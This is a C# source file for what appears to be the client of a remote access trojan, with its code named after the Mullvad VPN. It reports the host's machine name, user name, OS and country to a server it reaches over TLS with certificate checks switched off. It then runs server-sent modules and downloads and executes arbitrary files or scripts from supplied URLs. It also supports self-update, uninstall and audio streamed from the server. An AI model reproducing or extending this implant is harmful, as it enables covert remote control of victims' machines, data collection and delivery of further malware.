using System;
using System.Globalization;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using mullvad.Client.Modules;
using mullvad.Protocol;

namespace mullvad.Client.Network
{
    public sealed class ServerConnection : IDisposable
    {
        private readonly string _host;
        private readonly int    _port;

        private TcpClient?  _tcp;
        private SslStream?  _ssl;
        private CancellationTokenSource? _cts;
        private readonly SemaphoreSlim _writeLock = new SemaphoreSlim(1, 1);

        public bool IsConnected => _tcp?.Connected == true;

        public event Action<Packet>?    PacketReceived;
        public event Action<Exception?>? Disconnected;

        public ServerConnection(string host, int port)
        {
            _host = host;
            _port = port;
        }

        public async Task ConnectAsync(CancellationToken ct = default)
        {
            _tcp = new TcpClient { NoDelay = true };
            await _tcp.ConnectAsync(_host, _port);

            // SSL — accept the server's self-signed cert
            _ssl = new SslStream(
                _tcp.GetStream(),
                leaveInnerStreamOpen: false,
                userCertificateValidationCallback: (_, _, _, _) => true);

            await _ssl.AuthenticateAsClientAsync("mullvad-server");

            _cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            _ = ReadLoopAsync(_cts.Token);
        }

        public async Task SendHandshakeAsync()
        {
            var country = await GetCountryAsync();

            var arch = IntPtr.Size == 8 ? "x64" : "x86";

            var osVer    = Environment.OSVersion;
            var osName   = osVer.Platform == PlatformID.Win32NT ? "Windows" : osVer.ToString();
            var osEdition = osVer.ToString();

            var payload = new
            {
                computer     = Environment.MachineName,
                username     = Environment.UserName,
                os           = osName,
                os_edition   = osEdition,
                architecture = arch,
                country      = country,
                version      = "1.0.0",
            };
            await SendAsync(Packet.Create(PacketType.Handshake, payload));
        }

        public async Task SendAsync(Packet packet)
        {
            if (_ssl is null) return;
            await _writeLock.WaitAsync();
            try
            {
                var data = packet.Serialize();
                await _ssl.WriteAsync(data, 0, data.Length);
            }
            catch { }
            finally
            {
                _writeLock.Release();
            }
        }

        private async Task ReadLoopAsync(CancellationToken ct)
        {
            try
            {
                while (!ct.IsCancellationRequested && IsConnected)
                {
                    var packet = await Packet.ReadAsync(_ssl!, ct);
                    if (packet is null) break;

                    switch (packet.Type)
                    {
                        case PacketType.Ping:
                            await SendAsync(Packet.Create(PacketType.Pong));
                            break;

                        case PacketType.ModuleLoad:
                            await HandleModuleLoad(packet);
                            break;

                        case PacketType.ModuleExecute:
                            HandleModuleExecute(packet);
                            break;

                        case PacketType.ClientReconnect:
                            // Close this connection; the outer loop will reconnect
                            Disconnected?.Invoke(null);
                            return;

                        case PacketType.ClientTerminate:
                            ClientMain.ShouldExit = true;
                            Disconnected?.Invoke(null);
                            return;

                        case PacketType.ClientUninstall:
                            ClientMain.ShouldExit    = true;
                            ClientMain.ShouldUninstall = true;
                            Disconnected?.Invoke(null);
                            return;

                        case PacketType.ClientUpdate:
                            HandleUpdate(packet.Json);
                            ClientMain.ShouldExit = true;
                            return;

                        case PacketType.ClientExecFile:
                            await HandleExecFile(packet.Json);
                            break;

                        case PacketType.ClientExecUrl:
                            await HandleExecUrl(packet.Json);
                            break;

                        case PacketType.MicSendStart:
                            MicSend.HandleStart();
                            break;

                        case PacketType.MicSendData:
                            MicSend.HandleData(packet.Json);
                            break;

                        case PacketType.MicSendStop:
                            MicSend.HandleStop();
                            break;

                    }

                    PacketReceived?.Invoke(packet);
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex) { Disconnected?.Invoke(ex); return; }

            Disconnected?.Invoke(null);
        }

        private async Task HandleModuleLoad(Packet pkt)
        {
            string? moduleId = null;
            bool    success  = false;
            string  error    = "";
            try
            {
                moduleId        = JsonReader.Str(pkt.Json, "module_id") ?? "";
                var chunkIndex  = JsonReader.Int(pkt.Json, "chunk_index");
                var totalChunks = JsonReader.Int(pkt.Json, "total_chunks", 1);
                var data        = Convert.FromBase64String(JsonReader.Str(pkt.Json, "data") ?? "");

                var complete = ModuleRegistry.AddChunk(moduleId, chunkIndex, totalChunks, data);
                if (complete != null)
                {
                    error = ModuleRegistry.Load(moduleId) ?? "";
                    success = string.IsNullOrEmpty(error);
                }
                else
                {
                    return; // more chunks coming — no ack yet
                }
            }
            catch (Exception ex)
            {
                error = ex.Message;
                success = false;
            }

            if (moduleId != null)
            {
                await SendAsync(Packet.Create(PacketType.ModuleLoadAck, new
                {
                    module_id = moduleId,
                    success,
                    error,
                }));
            }
        }

        private void HandleModuleExecute(Packet pkt)
        {
            Task.Run(async () =>
            {
                string moduleId  = "";
                string requestId = "";
                try
                {
                    moduleId  = JsonReader.Str(pkt.Json, "module_id")  ?? "";
                    requestId = JsonReader.Str(pkt.Json, "request_id") ?? "";
                    var action  = JsonReader.Str(pkt.Json, "action")  ?? "";
                    var payload = JsonReader.Str(pkt.Json, "payload") ?? "";

                    var result = ModuleRegistry.Execute(moduleId, action, payload)
                                 ?? "{\"error\":\"Module not loaded\"}";

                    await SendAsync(Packet.Create(PacketType.ModuleData, new
                    {
                        module_id  = moduleId,
                        request_id = requestId,
                        data       = result,
                    }));
                }
                catch (Exception ex)
                {
                    if (moduleId.Length > 0 && requestId.Length > 0)
                    {
                        await SendAsync(Packet.Create(PacketType.ModuleData, new
                        {
                            module_id  = moduleId,
                            request_id = requestId,
                            data       = "{\"error\":\"" + ex.Message.Replace("\"", "'") + "\"}",
                        }));
                    }
                }
            });
        }

        private static void HandleUpdate(string json)
        {
            try
            {
                var url = JsonReader.Str(json, "url");
                if (string.IsNullOrWhiteSpace(url)) return;

                var tmp = System.IO.Path.Combine(
                    System.IO.Path.GetTempPath(),
                    "upd_" + Guid.NewGuid().ToString("N") + ".exe");

                using var wc = new System.Net.WebClient();
                wc.DownloadFile(url, tmp);

                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName        = tmp,
                    UseShellExecute = true,
                });
            }
            catch { }
        }

        // ── Remote execute: file upload + run, URL download + run ─────────────

        private static readonly System.Collections.Concurrent.ConcurrentDictionary<string, ExecFileState> _execFiles
            = new System.Collections.Concurrent.ConcurrentDictionary<string, ExecFileState>();

        private sealed class ExecFileState
        {
            public string FileName = "";
            public string Args     = "";
            public byte[][] Chunks = Array.Empty<byte[]>();
            public readonly object Lock = new object();
        }

        private async Task HandleExecFile(string json)
        {
            string transferId = JsonReader.Str(json, "transfer_id") ?? "";
            string fileName   = JsonReader.Str(json, "file_name")   ?? "file.exe";
            string args       = JsonReader.Str(json, "args")        ?? "";
            int chunkIndex    = JsonReader.Int(json, "chunk_index");
            int totalChunks   = JsonReader.Int(json, "total_chunks", 1);
            byte[] data;
            try   { data = Convert.FromBase64String(JsonReader.Str(json, "data") ?? ""); }
            catch { data = Array.Empty<byte>(); }

            bool success = false;
            string error = "";
            int pid = 0;

            try
            {
                if (string.IsNullOrEmpty(transferId)) throw new Exception("missing transfer_id");

                var state = _execFiles.GetOrAdd(transferId, _ => new ExecFileState
                {
                    FileName = fileName,
                    Args     = args,
                    Chunks   = new byte[totalChunks][],
                });

                state.Chunks[chunkIndex] = data;

                // Not all chunks yet — more are coming.
                foreach (var c in state.Chunks)
                    if (c == null) return;

                if (!_execFiles.TryRemove(transferId, out state)) throw new Exception("state lost");

                // Reassemble and write to temp
                int total = 0;
                foreach (var c in state.Chunks) total += c.Length;
                var bytes = new byte[total];
                int off = 0;
                foreach (var c in state.Chunks) { Buffer.BlockCopy(c, 0, bytes, off, c.Length); off += c.Length; }

                string safeName = state.FileName;
                foreach (char ic in System.IO.Path.GetInvalidFileNameChars()) safeName = safeName.Replace(ic, '_');
                string tempPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "mullvad_" + Guid.NewGuid().ToString("N").Substring(0, 8) + "_" + safeName);
                System.IO.File.WriteAllBytes(tempPath, bytes);

                pid = RunTempFile(tempPath, state.Args);
                success = pid != -1;
                if (!success) error = "failed to start process";
            }
            catch (Exception ex)
            {
                error = ex.Message;
                success = false;
            }

            await SendAsync(Packet.Create(PacketType.ClientExecAck, new
            {
                transfer_id = transferId,
                file_name   = fileName,
                success,
                error,
                pid,
            }));
        }

        private async Task HandleExecUrl(string json)
        {
            string url  = JsonReader.Str(json, "url")  ?? "";
            string args = JsonReader.Str(json, "args") ?? "";
            string transferId = JsonReader.Str(json, "transfer_id") ?? "";
            string fileName = "download.exe";
            bool success = false;
            string error = "";
            int pid = 0;

            try
            {
                if (string.IsNullOrWhiteSpace(url)) throw new Exception("missing url");

                fileName = System.IO.Path.GetFileName(new Uri(url).LocalPath);
                if (string.IsNullOrWhiteSpace(fileName)) fileName = "download.exe";

                string safeName = fileName;
                foreach (char ic in System.IO.Path.GetInvalidFileNameChars()) safeName = safeName.Replace(ic, '_');
                string tempPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "mullvad_" + Guid.NewGuid().ToString("N").Substring(0, 8) + "_" + safeName);

                using (var wc = new System.Net.WebClient())
                {
                    wc.Proxy = null;
                    wc.DownloadFile(url, tempPath);
                }

                pid = RunTempFile(tempPath, args);
                success = pid != -1;
                if (!success) error = "failed to start process";
            }
            catch (Exception ex)
            {
                error = ex.Message;
                success = false;
            }

            await SendAsync(Packet.Create(PacketType.ClientExecAck, new
            {
                transfer_id = transferId,
                url         = url,
                file_name   = fileName,
                success,
                error,
                pid,
            }));
        }

        private static int RunTempFile(string tempPath, string args)
        {
            bool isScript = tempPath.EndsWith(".bat", StringComparison.OrdinalIgnoreCase)
                         || tempPath.EndsWith(".cmd", StringComparison.OrdinalIgnoreCase)
                         || tempPath.EndsWith(".ps1", StringComparison.OrdinalIgnoreCase)
                         || tempPath.EndsWith(".vbs", StringComparison.OrdinalIgnoreCase);

            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName        = isScript ? tempPath : tempPath,
                Arguments       = args ?? "",
                UseShellExecute = true,
                CreateNoWindow  = false,
            };

            var proc = System.Diagnostics.Process.Start(psi);
            return proc?.Id ?? -1;
        }

        // ── Server microphone → local speakers ───────────────────────────────

        private static readonly Audio.MicSendPlayer _micSendPlayer = new Audio.MicSendPlayer();

        private static class MicSend
        {
            public static void HandleStart()
            {
                lock (_micSendPlayer)
                {
                    _micSendPlayer.Stop();
                    _micSendPlayer.Start();
                }
            }

            public static void HandleData(string json)
            {
                try
                {
                    string b64 = JsonReader.Str(json, "data") ?? "";
                    if (b64.Length > 0)
                        _micSendPlayer.Enqueue(Convert.FromBase64String(b64));
                }
                catch { }
            }

            public static void HandleStop()
            {
                lock (_micSendPlayer) { _micSendPlayer.Stop(); }
            }
        }

        private static async Task<string> GetCountryAsync()
        {
            // Try IP geolocation (3s timeout) — most accurate
            try
            {
                var req = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(
                    "http://ip-api.com/json?fields=countryCode");
                req.Timeout = 3000;
                req.Proxy   = null;
                using var resp   = await Task.Run(() => req.GetResponse());
                using var reader = new System.IO.StreamReader(resp.GetResponseStream()!);
                var json  = await reader.ReadToEndAsync();
                var match = System.Text.RegularExpressions.Regex.Match(json, "\"countryCode\":\"([A-Z]{2})\"");
                if (match.Success) return match.Groups[1].Value.ToLower();
            }
            catch { }

            // Fall back to installed Windows locale (more reliable than CurrentCulture)
            try { return new RegionInfo(System.Globalization.CultureInfo.InstalledUICulture.Name).TwoLetterISORegionName.ToLower(); }
            catch { }
            try { return new RegionInfo(System.Globalization.CultureInfo.CurrentUICulture.Name).TwoLetterISORegionName.ToLower(); }
            catch { }
            try { return new RegionInfo(System.Globalization.CultureInfo.CurrentCulture.Name).TwoLetterISORegionName.ToLower(); }
            catch { return "xx"; }
        }

        public void Dispose()
        {
            _cts?.Cancel();
            _ssl?.Dispose();
            _tcp?.Dispose();
        }
    }

    internal static class JsonReader
    {
        internal static string? Str(string json, string key)
        {
            var needle = "\"" + key + "\":";
            var ki = json.IndexOf(needle, StringComparison.Ordinal);
            if (ki < 0) return null;
            var vi = ki + needle.Length;
            while (vi < json.Length && json[vi] == ' ') vi++;
            if (vi >= json.Length || json[vi] != '"') return null;
            vi++;
            var sb = new StringBuilder();
            while (vi < json.Length && json[vi] != '"')
            {
                if (json[vi] == '\\' && vi + 1 < json.Length)
                {
                    vi++;
                    switch (json[vi])
                    {
                        case '"':  sb.Append('"');  break;
                        case '\\': sb.Append('\\'); break;
                        case 'n':  sb.Append('\n'); break;
                        case 'r':  sb.Append('\r'); break;
                        case 't':  sb.Append('\t'); break;
                        default:   sb.Append(json[vi]); break;
                    }
                }
                else sb.Append(json[vi]);
                vi++;
            }
            return sb.ToString();
        }

        internal static int Int(string json, string key, int def = 0)
        {
            var needle = "\"" + key + "\":";
            var ki = json.IndexOf(needle, StringComparison.Ordinal);
            if (ki < 0) return def;
            var vi = ki + needle.Length;
            while (vi < json.Length && json[vi] == ' ') vi++;
            var start = vi;
            while (vi < json.Length && (json[vi] == '-' || (json[vi] >= '0' && json[vi] <= '9'))) vi++;
            return vi > start && int.TryParse(json.Substring(start, vi - start), out var v) ? v : def;
        }
    }
}
